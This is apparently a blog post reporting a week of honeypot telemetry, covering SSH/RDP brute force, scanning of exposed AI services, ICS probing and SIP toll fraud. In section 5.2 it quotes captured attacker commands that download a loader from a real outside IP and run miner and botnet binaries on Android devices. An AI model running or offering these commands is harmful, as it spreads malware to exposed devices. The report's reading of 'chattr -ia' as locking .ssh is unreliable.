---
title: "Weekly Threat Intelligence Report — T-Pot Honeypot (Jul 7–11, 2026)"
date: 2026-07-12
draft: false
description: "First weekly report from the T-Pot honeypot: ~1,011,000 events across 10 sensors, Redtail multi-architecture malware, complete Android infection chain (Rebirth → UFO Miner → Trinity), scanning of exposed AI services (Ollama, Gradio), IEC-104 probing on ConPot, and VoIP toll fraud campaign on Sentrypeer."
tags: ["Honeypot", "TPot", "ThreatIntel", "SOC", "BlueTeam", "Cowrie", "Dionaea", "Adbhoney", "Sentrypeer", "ConPot", "Honeytrap", "Suricata", "Redtail", "Rebirth", "Trinity", "ICS", "SCADA", "VoIP", "TollFraud", "Malware", "IoT", "Botnet"]
categories: ["Honeypot Diaries"]
---

{{< lead >}}
First weekly report from the T-Pot honeypot. During the week of **July 7–11, 2026**, approximately **1,011,000 attack events** were recorded across 10 active sensors. Top findings: multi-architecture *Redtail* malware captured in Cowrie, a complete Android infection chain in Adbhoney (Rebirth → UFO miner → Trinity botnet), active scanning of exposed AI services (Ollama, Gradio, Streamlit), and probing of the IEC-104 protocol used in European electrical substations.
{{< /lead >}}

---

**Period analyzed:** July 7–11, 2026
**Source:** T-Pot (multi-honeypot + ELK Stack) — publicly internet-exposed instance
**Classification:** Portfolio use / TLP:CLEAR

---

## 1. Executive Summary

During the analyzed week, the honeypot recorded **~1,011,000 attack events** across 10 active sensors, originating from thousands of unique source IPs. Activity was not uniform: a **clear traffic spike between July 9 and 10** is observed across nearly all sensors simultaneously, suggesting one or more mass scanning campaigns launched in that interval rather than constant organic activity.

Most relevant findings of the week:

- **Multi-architecture malware captured in Cowrie** (*Redtail* family, binaries for ARM7, ARM8, i686, and x86_64), downloaded after successful SSH brute force.
- **Complete Android infection chain captured in Adbhoney**: loader download (`rebirth.arm7`), mining app installation (`com.ufo.miner`), and execution of a *Trinity* family binary.
- **Targeted scanning of exposed AI services** (Ollama, Gradio, Streamlit) detected in Honeytrap — a pattern characteristic of 2025–2026, not "classic" IoT malware.
- **IEC-104 protocol probing** (port 2404) in ConPot — the standard telecontrol protocol used in European electrical substation control systems.
- **Toll fraud activity against Sentrypeer**, targeting French and international number ranges, with SIP `INVITE`/`REGISTER` methods dominant.
- **99%+ of traffic is flagged as "known attacker"** by IP reputation — infrastructure already catalogued in threat databases, not random internet noise.
- A significant portion of the volume (*Modat B.V.*, *ONYPHE SAS*) corresponds to **known internet research scanners** (like Shodan/Censys), not necessarily malicious actors — an important nuance to avoid overestimating the actual threat level.

---

## 2. Volume and Weekly Trend

| Honeypot | Events (week) | Unique IPs | % of total |
|---|---:|---:|---:|
| Honeytrap | 678,792 | 6,119 | 67.2% |
| Cowrie (SSH/Telnet) | 116,390 | 823 | 11.5% |
| RDPHoneypot | 111,818 | 250 | 11.1% |
| Dionaea | 61,123 | 683 | 6.0% |
| Sentrypeer (SIP/VoIP) | 36,522 | 112 | 3.6% |
| Adbhoney (Android ADB) | 2,618 | 63 | 0.3% |
| Tanner | ~2,000 | — | 0.2% |
| ConPot (ICS/SCADA) | 1,594 | 128 | 0.2% |
| Mailoney | 906 | — | 0.1% |
| Honeyaml | 660 | — | 0.1% |
| **Approx. total** | **~1,011,000** | — | 100% |

Honeytrap concentrates two-thirds of total volume, but this is misleading if interpreted as "the most attacked honeypot" — Honeytrap responds on nearly any TCP port, so it absorbs all generic internet scanning noise. Cowrie and RDPHoneypot, with far fewer events but more complete interactions (login, command execution, sessions), yield higher-quality intelligence.

The temporal trend shows constant background activity with a **pronounced spike between July 9–10**, consistently visible across Honeytrap, RDPHoneypot, and Adbhoney simultaneously — indicating a large-scale scanning campaign was launched (or completed a reconnaissance cycle) that day, touching multiple exposed services on the instance.

---

## 3. Geographic and Infrastructure Analysis

### Most frequent countries of origin

Canada, Brazil, France, Singapore, United States, Netherlands, Bulgaria, Azerbaijan, China, and India appear consistently across different honeypots, with variations by protocol: Bulgaria/Azerbaijan stand out in RDP, China/India in Cowrie.

### Most frequent ASN / Hosting

| ASN | Organization | Honeypot | Events |
|---|---|---|---:|
| 209334 | Modat B.V. | Honeytrap | 346,372 |
| 264897 | SKYMAX Telecomunicações | Honeytrap | 113,038 |
| 202053 | UpCloud Ltd | Honeytrap | 76,039 |
| 14061 | DigitalOcean, LLC | Cowrie | 21,687 |
| 197170 | TechTies Inc. | Cowrie | 20,894 |
| 201814 | MEVSPACE sp. z o.o. | RDPHoneypot | 39,105 |
| 213438 | ColocaTel Inc. | RDPHoneypot | 37,466 |
| 23470 | ReliableSite.Net LLC | Adbhoney | 2,021 |

> **Note:** *Modat B.V.* and *ONYPHE SAS* are known **internet scanning organizations for research/threat intelligence purposes** (comparable to Censys or Shodan). An analyst doesn't count this traffic the same as botnet traffic: it's internet background noise, useful for perspective but not indicative of directed hostile intent.

In contrast, **ReliableSite.Net concentrates 77% of all Adbhoney traffic** (2,021 of 2,618 events) — a sign of a concentrated campaign, a single operator reusing bulletproof infrastructure.

### Repeated subnet pattern

IPs `45.153.34.149`, `.151`, `.161`, and `.181` appear in Cowrie with nearly identical counts (~3,817 events each). Classic signature of an **operator rotating IPs within the same /24** to evade per-IP blocking — a well-configured IDS should block at the subnet level, not individual IPs.

---

## 4. Observed TTPs

### 4.1 Target credentials — SSH/RDP brute force (Cowrie)

| Username | Attempts | | Password | Attempts |
|---|---:|---|---|---:|
| Administrator | 12,939 | | (empty) | 29,534 |
| root | 4,993 | | 123456 | 896 |
| admin | 845 | | 1234 | 336 |
| ubuntu | 298 | | password | 304 |
| user | 265 | | 12345678 | 233 |
| sa | 256 | | 123 | 380 |

The dominance of `Administrator` (12,939 of 15,096 captured usernames) is consistent with attacks targeting **RDP/Windows**. The `sa` user confirms MSSQL database probing. Passwords mix generic dictionaries with "fake complex" patterns (`P@ssw0rd2025`, `Admin@123`) designed to pass basic complexity policies.

Curious detail: `345gs5662d34` / `3245gs5662d34` appear both as username and password with identical counts (102) — pattern of a script with a malformed dictionary that tries these strings in both fields as a fallback default.

### 4.2 Post-exploitation — reconnaissance after login (Cowrie)

Most repeated command sequence after a simulated valid login:

```bash
uname -a
cat /proc/cpuinfo | grep name | wc -l
cd ~; chattr -ia .ssh; lockr -ia .ssh
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
top
```

This is a **pre-payload system fingerprinting script**: it collects CPU, architecture, and RAM before deciding which binary to download. The `chattr -ia .ssh` command is especially revealing — **it locks the `.ssh` directory with the immutable attribute** to prevent other actors or the administrator from modifying SSH keys. A "marked territory" technique common in worms competing with each other for the same host.

### 4.3 Suricata Alerts

| Signature | Count |
|---|---:|
| SURICATA STREAM Packet with broken ack | 173,847 |
| SURICATA STREAM spurious retransmission | 96,038 |
| SURICATA AF-PACKET truncated packet | 82,279 |
| SURICATA IPv4 truncated packet | 81,337 |
| SURICATA SSH invalid banner | 15,412 |
| ET INFO SSH session in progress on Expected Port | 5,560 |

The bulk are **aggressive, poorly implemented scanners** (improperly closed TCP connections, invalid SSH banners from automated tools), not active exploits. Important: don't present the 173,847 broken packets as "173,847 attacks" — it's background noise telemetry, not real intrusion attempts.

### 4.4 CVEs correlated by Suricata

| CVE | Detections | Family |
|---|---:|---|
| CVE-1999-0016 | 12 | Land attack (IP spoofing) |
| CVE-2022-37055 | 11 | — |
| CVE-2019-12263 and related | 7 | — |
| CVE-2020-11900 | 3 | Ripple20 (Treck TCP/IP stack, IoT/ICS) |
| CVE-2020-11910 | 1 | Ripple20 |

CVE-2020-11900/11910 belong to the **Ripple20** family (Treck TCP/IP stack used in IoT/industrial devices), consistent with the general profile of opportunistic traffic against embedded devices throughout the week.

### 4.5 Scanning of exposed AI services (Honeytrap)

| Port | Typical service |
|---|---|
| 11434 | Ollama (LLM inference API) |
| 7860 | Gradio (ML/AI demo web interface) |
| 8501 | Streamlit (ML/AI dashboards) |
| 1337 | Classic hacking tool port |
| 8728 | MikroTik API (routers) |

Active and sustained scanning against **Ollama, Gradio, and Streamlit** is a distinctive finding: it confirms that threat actors have already incorporated **poorly secured self-hosted AI infrastructure** as a mass reconnaissance target, in the same category as exposed routers or IP cameras. In 2026 this is no longer an emerging trend — it's background traffic.

---

## 5. Captured Malware and Payloads

### 5.1 Cowrie — *Redtail* family (multi-architecture)

After successful login attempts, the following downloads were captured:

- `redtail.arm7`
- `redtail.arm8`
- `redtail.i686`
- `redtail.x86_64`

Compilation for **four architectures** (ARM 32/64-bit, x86, and x86_64) confirms a loader designed to maximize compatibility across cloud servers (x86_64), embedded ARM devices, and legacy systems (i686) — typical pattern of modern cryptocurrency mining botnets that don't discriminate by victim type.

### 5.2 Adbhoney — Complete Android infection chain

The most complete capture of the week. Sequence observed in full:

```bash
# 1. Loader download (Rebirth botnet, Mirai-like variant)
busybox wget http://94.154.43.48/rebirth.arm7 -O /data/local/tmp/com.sup[...]

# 2. Mining APK installation
pm install /data/local/tmp/ufo.apk

# 3. Miner execution
am start -n com.ufo.miner/com.example.test.MainActivity

# 4. Trinity binary execution (second botnet family)
ps | grep trinity
/data/local/tmp/nohup su -c /data/local/tmp/trinity
```

This documents from start to finish how an automated actor uses an Android device with exposed ADB (smart TVs, Android TV boxes, misconfigured emulators) to: **download loader → install mining APK → execute a second botnet binary**. Three distinct families in a single infection session.

---

## 6. Dionaea — Database and File Services

**61,123 attacks, 683 unique IPs.** Dionaea simulates classic vulnerable services (SMB, RPC, MySQL, MSSQL, MongoDB, FTP, PPTP, MQTT).

The dominant protocol is **SMB** (port 445), followed by `epmapper` (RPC, port 135), `mysqld` (3306), and `mssqld` (1433) — the same vectors popularized by WannaCry, still active.

Tested credentials (`admin`, `sa`, `root`, `anonymous`) are default MSSQL and MongoDB/FTP accounts, not mass dictionaries — a pattern more targeted at specific services than generic brute force.

IPs `62.84.80.240` to `62.84.80.243` (four consecutive addresses, ~5,600–5,700 events each) repeat the **rotation pattern within the same /29–/30 subnet** already seen in Cowrie.

| ASN | Organization | Events |
|---|---|---:|
| 42334 | Broadband Plus S.a.l. (Lebanon) | 22,578 |
| 58224 | Iran Telecommunication Company PJS | 14,225 |
| 56041 | China Mobile Communications | 6,302 |
| 45899 | VNPT Corp (Vietnam) | 3,230 |

---

## 7. Sentrypeer — Telephone Fraud (Toll Fraud) over SIP/VoIP

**36,522 attacks, 112 unique IPs.** Virtually no activity until July 9, when it suddenly spikes and stays elevated the rest of the week — the start of a specific VoIP reconnaissance/fraud campaign within the analyzed window.

The dominant SIP method is **INVITE** (attempt to initiate a call), followed by `REGISTER` (fake extension registration). Captured user-agents (`Linksys-SPA942`, `Avaya one-X Deskphone`, `Yealink SIP-T54W`, `Cisco-SIPGateway`, `FPBX-15.0.17`) are profiles of real IP phones and PBX systems, typical of scanners that rotate SIP client fingerprints to avoid detection.

Target numbers with prefix `0033` (France) and `0016...` (North America) are consistent with **toll fraud**: the goal is to get the compromised PBX to originate calls to premium rate numbers that generate revenue for the attacker.

IPs `217.154.196.x` / `217.154.197.x` and `31.70.86.6x` repeat the contiguous block pattern observed across other sensors this week.

---

## 8. ConPot — Industrial Infrastructure (ICS/SCADA) Reconnaissance

**1,594 attacks, 128 unique IPs.** Low volume, but the honeypot simulates industrial control infrastructure — any interaction is relevant based on the type of target, not the number.

Activity starts exactly like Sentrypeer: virtually none before July 9, with sustained growth from that date. Second indicator that July 9 marked the start of a **broader reconnaissance window against the instance**, not just isolated activity on one sensor.

### Protocols and ports

The dominant protocol is **SNMP** (port 161, ~50% of traffic), followed by `guardian_ast` (port 10001, fuel tank monitoring systems), and occasionally `kamstrup_protocol` (smart energy meters) and **IEC-104** (port 2404).

**IEC-104 deserves special mention:** it's the standard telecontrol protocol used in European electrical substations. Active probing against this port, even at low volume, is data a power operator's SOC would consider high priority — in a research honeypot it's evidence that actors are actively scanning ICS ports in the electrical sector, not just generic SNMP.

---

## 9. Conclusions

1. **The July 9–10 spike** is reflected simultaneously across Honeytrap, RDPHoneypot, Adbhoney, Sentrypeer, and ConPot. Five different sensors rising at the same time points to a coordinated or shared-infrastructure reconnaissance campaign, not coincidence.

2. **Block at /24 subnet level, not individual IPs.** The rotation pattern among contiguous IPs from the same operator (visible in Cowrie, Dionaea, and Sentrypeer) makes per-IP blocking ineffective. A /24 or even /20 block would have eliminated thousands of events before they reached the sensor.

3. **Ollama, Gradio, and Streamlit are already in mass scanning dictionaries.** Any environment with these services exposed without authentication should be treated with the same priority as an exposed RDP or SSH — they're not "developer tools," they're unauthenticated HTTP services accessible from the internet.

4. **Distinguish protocol noise from alerts with real intent.** The 173,000+ Suricata STREAM broken ack events are a consequence of poorly implemented scanning tools, not intrusion attempts. Presenting them as attacks artificially inflates the report's perceived severity.

5. **The Rebirth → UFO Miner → Trinity chain** captured in Adbhoney is a complete Android/IoT infection case study; it warrants a separate technical post.

6. **IEC-104 probing in ConPot** should be kept under watch: any future uptick on that specific port, in combination with another active sensor, warrants priority attention given the type of infrastructure it simulates.

---

*Report compiled from data collected in a publicly internet-exposed T-Pot instance. Methodology: export of aggregated Kibana dashboards (range July 7–11, 2026) plus credential tag clouds in CSV.*
